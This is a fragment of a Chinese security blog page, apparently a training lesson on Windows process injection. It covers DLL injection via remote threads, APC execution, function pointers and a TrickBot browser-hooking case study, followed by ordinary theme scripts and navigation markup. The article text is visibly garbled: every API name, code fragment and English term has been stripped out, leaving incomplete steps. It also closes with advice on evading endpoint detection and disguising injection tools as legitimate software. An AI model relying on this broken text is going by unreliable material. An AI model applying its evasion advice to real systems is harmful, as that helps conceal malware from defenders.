恶意的路径分配内存区域将恶意的路径写入已分配的内存中加载并执行恶意刚才提到的五个步骤描述了基本的注入过程以下是对每个步骤的简要解释寻找要注入的目标进程这可能涉及到获取目标进程的进程标识符或根据进程名称定位目标进程打开目标进程使用相关的函数例如来获取目标进程的句柄以便后续的操作为恶意的路径分配内存区域使用或类似的函数在目标进程的虚拟地址空间中分配内存将恶意的路径写入分配的内存使用将恶意的路径写入到先前已经分配好的内存区域加载并执行恶意通过调用或类似的函数加载恶意并开始执行其中的代码接下来我们将分解一个基本的注入器来认识上述每个步骤并在下面进行更深入地解释在注入的第一步中我们将使用三个调用来定位进程和为指定的进程线程创建快照在快照中包含系统中的所有进程要包含在快照中的进程的进程标识符该参数可以为零以指示当前进程添加一个指向结构的指针获取结构的字节大小获取快照中的第一个进程快照句柄指向结构的指针比较两个字符串以确定进程名称是否匹配中当前进程的可执行文件名被提供的进程名称已成功匹配的进程的进程获取快照中的下一个进程快照句柄指向结构的指针存储经过进程枚举之后得到的进程这段代码的功能是通过进程名称查找对应进程的进程以下是对代码段的分析创建一个包含进程的快照是一个用于获取系统信息的函数此处使用参数表示获取系统中所有进程的快照而表示获取当前进程的快照检查是否成功创建了进程快照定义了一个结构体变量用于存储进程信息设置结构体的大小使用函数获取第一个进程的信息如果成功获取则进入循环在循环中比较当前进程的可执行文件名与给定的进程名字如果匹配成功则返回该进程的进程使用函数获取快照中的下一个进程的信息然后循环继续直到没有更多的进程调用刚才的函数以获取指定进程名字的进程并将其存储在变量中总体而言这段代码将通过遍历系统中的进程列表来查找指定名字的进程并返回该进程的进程接下来是注入的第二步在成功枚举后我们需要打开进程这可以通过使用各种调用来完成或打开目标进程请求对进程具有所有可能的访问权限表示子进程不继承父进程句柄子进程通常不需要继承父进程的句柄已存储的进程在注入的第三步中我们必须在目标进程中为恶意的路径分配内存以供其驻留与大多数注入器一样这可以通过使用来完成将包含已分配的内存的基地址后续可以将路径写入这块内存并在进程中加载该目标进程的句柄表示让系统决定内存分配的基地址路径的大小保留和提交内存页面用于保留虚拟地址空间用于提交物理内存启用对已提交内存页面的执行和读写访问权限在注入的第四步中我们需要将恶意的路径写入已分配的内存位置我们可以使用来将数据写入已分配的内存区域中目标进程的句柄已经分配好的内存区域是之前通过分配的内存空间的基地址恶意的路径表示要写入的数据的字节数包括字符串末尾的终止符这将确保整个字符串被写入到目标进程的内存中表示不使用任何特殊的标志最后是注入的第五步在恶意的路径被写入内存之后我们要做的就是加载并执行它我们需要先导入从导入一旦导入完成我们就可以通过在函数中指定作为启动函数来加载指定路径的恶意完成加载后目标进程将自行执行恶意包含调用的模块的句柄导入调用加载指定路径的恶意目标进程的句柄堆栈在可执行文件中的默认大小指向起始函数的指针指向已分配内存区域的指针该内存区域包含了先前写入的路径创建后立即运行关于的定义要在其中创建线程的进程的句柄线程的安全属性为新线程指定安全描述符线程栈的大小堆栈的初始大小以字节为单位该指针表示远程进程中线程的起始地址指向要传递给线程函数的参数变量的指针控制线程创建的标志指向接收线程标识符的变量的指针上面这段代码主要用于在目标进程中创建一个远程线程并在该线程中调用函数从而加载先前写入的恶意以下是对代码的分析函数用于获取指定模块这里是中导出函数的地址在这里它获取了函数的地址并将其强制转换为类型函数用于在目标进程中创建一个新的线程该函数的参数包括目标进程的句柄使用默认的安全性描述符使用默认的堆栈大小指向线程起始函数的指针这里的值是函数的地址指向已分配内存区域的指针该内存区域包含了先前写入的恶意的路径创建线程后立即运行新线程的标识符关于恶意的加载上述代码使用在目标进程中创建一个新线程新线程的起始函数是函数参数为当新线程运行时它就会调用其中是指向已分配内存区域的指针而该内存区域包含了先前写入的恶意的路径这样就可以通过调用函数在目标进程中加载指定路径的恶意关于恶意的执行函数被调用后会在目标进程的虚拟空间中加载指定路径的恶意但这一步并没有直接将恶意的内容写入到目标进程的虚拟空间而是创建了恶意的内存映射将恶意的代码和数据映射到目标进程的地址空间中从而使得恶意的代码可以在目标进程中执行这种方式实际上是一种外部注入即通过指定的路径实现恶意的加载而不是直接将恶意的二进制内容写入到目标进程的内存空间实际的恶意的二进制内容是在函数被调用时系统动态地从文件中读取并映射到目标进程的关于写入和映射的区别写入和映射的区别在于操作的对象和目的写入是将数据从一个地方复制到另一个地方而映射是将文件或内存段映射到内存中的一部分选择写入还是映射取决于具体的使用场景和需求对于小型数据写入可能足够高效而对于大型数据块映射通常更为有效在上述注入的代码中我们没有显式地为的二进制内容分配空间而是依赖于函数的加载机制这是因为本身会负责在目标进程中分配并映射的代码和数据所需的虚拟空间我们在上述注入过程中主要关注的是传递路径的过程而具体的内容加载则由处理我们可以将上述这些步骤编译在一起以创建一个注入器并使用由本文实验环境所提供的注入器来尝试进行注入实验在注入技术中有两种主要的方式来将加载到目标进程中外部注入外部注入是通过函数通过指定的路径来实现的这种方式不直接将的二进制内容写入到目标进程而是由函数在运行时动态地加载的二进制内容外部注入的过程中我们通过写入的是的路径而不是的实际内容内部注入内部注入是通过直接将的二进制内容写入到目标进程的虚拟空间中来实现的这种方式通常需要手动解析的头将各个段例如代码段数据段逐一写入到目标进程内部注入不依赖于而是手动处理的加载过程区别外部注入通过指定路径进行加载系统负责在函数运行时动态地将的内容映射到目标进程中数据注入过程主要是写入的路径内部注入通过直接将的二进制内容写入目标进程来完成注入需要手动处理的加载过程包括解析头逐段写入等不依赖于函数总体而言外部注入相对较简单因为它依赖于系统的动态加载机制而内部注入则需要更多手动的处理选择哪种方式通常取决于具体的应用场景和需求关于内存执行的其他方案根据我们所处的环境我们可以需要适当地更改执行的方式当我们面临调用上有钩子并且我们无法规避或取消钩子正在监视线程等情况时就可能需要重新考虑关于内存执行的方案端点检测与响应到目前为止我们主要研究了在本地远程进程中分配空间以及向其中写入数据的方法但是在进程注入技术中内存执行也是至关重要的一步尽管这一步在尝试最大程度地减少内存痕迹和危害指标时并不那么重要与分配空间和写入数据不同关于内存执行有很多选项可供我们选择在本文内容中我们主要通过和来观察内存执行的情况在本小节中我们将根据具体的环境情况介绍三种可供使用的另外三种内存执行方法调用函数指针函数指针是一种奇特的新颖的内存块执行方法仅依赖于强制类型转换该技术只能使用本地分配的内存来完成执行并且不依赖于任何调用或其他系统功能下面的一行代码是函数指针最常见的形式我们将进一步分解它来解释它的组成部分函数指针上述这个单行代码可能很难理解或解释因为它非常密集让我们浏览一下它处理指针的过程创建一个函数指针即上图中的红色标记部分将已分配的内存指针或数组强制转换类型为函数指针即上图中的黄色标记部分调用函数指针来执行即上图中的绿色标记部分这种技术的实际用例比较特殊但是有时候也可能非常有用异步过程调用根据微软的相关文档所述异步过程调用是指在特定线程的上下文中异步执行的函数函数通过在线程中排队一旦函数进入线程队列就将导致软件中断并会在下次调用线程时执行该函数为了让用户态用户模式应用程序对函数进行排队线程必须处于可警报状态可警报状态将要求线程等待回调例如或现在我们了解了函数是什么让我们来看看它们是如何被恶意使用的此外在代码中我们将使用和来分配和写入内存指向由定义的已分配内存的函数指针结构中的线程句柄恢复被挂起的线程结构中的线程句柄结构中的线程句柄无限等待直到收到警报该技术是线程执行的一个很好的替代方案但它可能会被网络安全检测工程所检测到并且蓝队可以针对滥用部署特定蜜罐根据我们所面临的网络安全检测措施的不同异步过程调用技术可能仍然会是一个不错的选择节处理恶意软件研究中常见的技术是和节处理格式定义了中可执行文件的结构和格式出于执行的目的我们将主要关注节特别是和此外节表和指向节的指针也常被用于执行数据在此我们不会深入研究这些处理技术因为它们很复杂并且需要进行大量的技术分解但是我们将讨论它们的基本原理为了开始使用任何节处理技术我们需要先获取转储而获取转储通常是通过将恶意或其他恶意文件提供给专门的反汇编和分析工具例如等来完成的每种节处理方法的核心都是使用数学运算来操作物理的十六进制数据这些数据随后将被转换为数据一些较为常见的节处理技术包括入口点解析节映射和重定位表解析等注意对于所有的进程注入技术我们都可以通过混合和匹配常用的研究方法来进行改进这将为攻击者提供大量操作和执行恶意数据的选项浏览器注入和钩子的案例研究为了更好地了解进程注入的含义我们可以观察一种恶意软件的策略技术和程序初步研究成果是一种针对银行的知名恶意软件最近在金融犯罪软件中重新流行起来在本小节中我们将观察该恶意软件的主要功能浏览器钩子浏览器钩子允许恶意软件挂钩有趣的调用而这些调用可被用于拦截窃取凭据在开始我们的分析之前让我们看看是如何以浏览器为目标的从的逆向工程中可以明显看出将被用来获取常见浏览器路径的句柄以下是相关的反汇编结果将相关注入的基本程序流程概述如下打开目标进程分配内存将函数复制到已分配的内存中将复制到已分配的内存中刷新缓存以提交更改创建一个远程线程恢复线程或回退以创建新的用户线程或者是一个函数通常用于刷新处理器的指令缓存在涉及动态生成和执行代码的情况下特别是在一些系统编程或底层编程的场景中这个函数会变得很有用完成注入后一种恶意软件将调用在上述第三步中复制到已分配的内存中的钩子安装函数下面是提供的关于安装函数的伪代码具有位相对偏移量的跳转操作码使用函数将指定内存区域的保护属性设置为手动编写钩子返回到原来的保护状态这段伪代码涉及到函数的挂钩实现主要目的是创建一个跳板使得在执行原始函数时能够在适当的时机跳转到钩子函数然后等钩子函数执行完之后再返回到原始函数的执行流程以下是对代码段的逐步分析计算相对偏移量表示用于替代原始函数的钩子函数则是原始函数的地址从处读取字节数据一个然后使用减去这个再减去就得到相对偏移量从地址加的位置读取一个字节的数据并存储在中该字节通常会包含一些与函数执行相关的信息从地址加的位置读取一个指针大小的数据并存储在中该指针通常会指向一个跳板设置一个具有位相对偏移量的跳转指令的操作码这是汇编中的相对跳转指令使用函数将指定内存区域的保护属性设置为从处读取字节数据并存储在中计算一个相对偏移量将原始函数的字节与其他偏移值相减将地址偏移处的字节数据设置为相对跳转指令的操作码将地址偏移处的字节数据设置为通过计算得到的相对偏移量调用函数该函数的作用是在处写入个字节用于执行跳转使用函数将指定内存区域的保护属性设置回原始状态设置结果标志为成功返回则表示操作成功这段代码实现了一个函数的该代码通过创建一个跳板来实现对原始函数的替换和调用值得注意的是这种底层的内存操作可能会涉及系统编程和一些特定场景需要谨慎使用关于跳板函数让我们逐步解释一下与上述代码相关的挂钩过程挂钩前状态原始函数有一段字节码其中包含一个跳转指令通常用于跳转到函数的实际实现我们可以修改这个跳转指令以便将控制流引导到钩子函数而非原始函数挂钩后状态在挂钩的过程中原始函数的跳转指令将被修改以便使其指向钩子函数这就是为什么需要一个跳板函数的原因跳板函数保存了被修改的字节以便在钩子函数执行完成后能够将这些字节还原从而正确返回到原始函数的执行流程钩子函数执行当程序执行到被挂钩的函数时实际上会跳转到钩子函数而钩子函数执行完自己的逻辑后需要将控制流程正确地还原到原始函数以保持程序的正常执行跳板函数的作用跳板函数的目的就是在钩子函数执行完成后将原始函数的字节还原回被修改前的状态以确保控制流程能够正确返回到原始函数这就是为什么需要保存原始函数的部分字节并在跳板函数中执行还原操作的原因总的来说跳板函数在挂钩过程中充当了一个中间层保存了原始函数的状态以确保在钩子函数执行完后能够正确地返回到原始函数的执行流程维护程序的正常执行注意在本小节所提供的伪代码段中并未直接给出跳板函数所执行的具体还原操作接下来让我们尝试分解上面这段代码我们所看到的第一部分代码段可以被确认为是在定义函数指针我们可以从上文关于调用函数指针的介绍中回忆起这一点这段伪代码涉及到对函数的跳板的创建通常用于函数挂钩的场景下面是对这部分代码的解析计算相对偏移量表示用于替代原始函数的钩子函数则是原始函数的地址将得到原始函数的地址偏移字节的位置将获取该地址处的字节数据一个然后使用减去这个再减去就能得到相对偏移量从原始函数的地址加的位置读取一个字节的数据并存储在中这个字节通常会包含一些与函数执行相关的信息例如操作码或其他标志从原始函数的地址加处读取一个指针大小的数据存储在中这个指针通常将指向一个函数的跳板用于保存原始函数的部分字节以便在钩子函数执行完后能够正确跳回到原始函数的执行流程这段伪代码的目的是创建一个跳板将与原始函数关联起来使得在执行原始函数时能够在适当的时机跳转执行一旦定义了函数指针恶意软件就会使用它们来通过修改函数的内存保护这段代码调用了函数想要更改内存保护属性让我们逐步分析它是一个函数用于修改进程的虚拟内存保护属性是一个特殊的句柄值表示对所有进程都有效的特殊标识符它相当于参数指定了要修改保护属性的进程的句柄是一个指针指向要修改保护属性的内存区域的起始地址是一个字节大小的变量用于指定要修改的内存区域的大小是新的保护属性在这里对应于表示允许执行读取和写入是一个指向变量的指针用于存储原始的保护属性整个语句使用进行条件判断如果调用成功则条件为真将继续执行后继的块内的代码总的来说这段代码想要修改指定内存区域的保护属性使其可执行可读可写这种操作通常在进行底层编程代码注入或等场景中使用需要注意的是这种操作可能涉及到系统级别的权限和风险应谨慎使用此时代码就变成了带有函数指针钩子的恶意软件从本质上讲此代码部分将重写一个钩子并使其指向操作码跳转手动编写钩子这段代码的目标是修改原始函数的一部分代码使其在被调用时跳转到钩子函数让我们逐行分析这段代码从地址加处读取字节数据并存储在中这通常是函数的一部分指令或数据从地址加处读取一个字节的数据将其转换为类型然后减去和这是在计算一个相对偏移量将地址偏移处的字节即第个字节设置为这是汇编指令集中的相对跳转指令的操作码将地址偏移处的字节数据设置为的值这可能是在设置跳转指令的目标地址将一个位整数的值写入到原始函数中偏移处的位置这种操作通常用于在操作中修改原始函数的一部分字节以实现对函数行为的修改调用函数该函数的作用是在处写入个字节用于执行相对跳转指令这通常是用于手动编写钩子即更改函数的执行路径这段代码的目的是创建一个相对跳转的钩子通过修改原始函数的字节将其替换为一个跳转指令使得在执行原始函数时会跳转到指定的地址这样的操作通常用于实现函数钩子允许在函数执行时插入自定义的代码通过这种方式当原始函数被调用时它会在执行到第个字节的跳转指令时跳转到钩子函数执行这就实现了对原始函数的拦截和修改代码段还使用了函数将指定内存区域的保护属性设置回原始状态这样一旦完成挂钩就可以将函数返回到原来的内存保护状态返回到原来的保护状态这段代码使用了函数将指定内存区域的保护属性还原到之前所保存的原始状态让我们逐步分析一下这段代码传递一个特殊的句柄值在中通常表示无效句柄或者对所有进程都有效的特殊标识符从处读取一个指针大小的数据这通常是指向之前所保存的跳板的指针这个指针指向一个内存区域其中包含了原始函数的一部分字节和一些相关的操作从地址加处读取一个字节的数据这个字节通常包含了原始函数的一些信息可能与其执行方式有关这是一个先前保存的变量用于存储执行操作之前的原始内存保护属性一个指向变量的指针即的地址用于指向此函数执行后的内存保护属性总体而言这段代码的作用是调用函数将之前通过操作修改的内存区域的保护属性还原到原来的状态这通常是为了保证在操作期间对内存的修改不会对程序的正常执行产生不良影响这种操作常见于实现时的最后步骤对于来说它的钩子函数的主要特点是会通过反射注入将自身注入到浏览器进程中并且会从已注入的函数中挂钩调用在计算机领域可以同时作为名词和动词使用作为名词时可以表示一种机制或函数用于截取拦截或改变特定操作事件的处理方式例如意味着截取某个函数的执行使其执行一个定制的操作作为动词时表示应用或实施机制例如意味着对某个函数进行拦截或改变其执行方式总之可以灵活地用作名词或动词需要根据上下文语境才能确定其具体含义总结进程注入是一种总体性的技术可以在许多不同情境中被使用进程注入也是滥用内部机制的最常见情况之一需要注意的是随着网络安全检测工程与监控技术的发展进程注入技术也需要不断发展本文所介绍的大多数技术都会被流行的商业终端检测与响应工具检测到但是我们仍然可以尝试修改我们的注入器以便满足红队行动的操作需求当我们准备将这些进程注入技术合并到属于自己的工作或工具中时建议仅将这些注入技术用作组成一个更大的工具的一小部分同时通过混合和匹配用于进程注入的组件还可以有效地让我们的攻击工具尽可能接近合法的应用程序与本文实验环境所提供的注入器相关的部分代码资源如下代码代码代码代码代码代码',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-01 16:11:57',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div 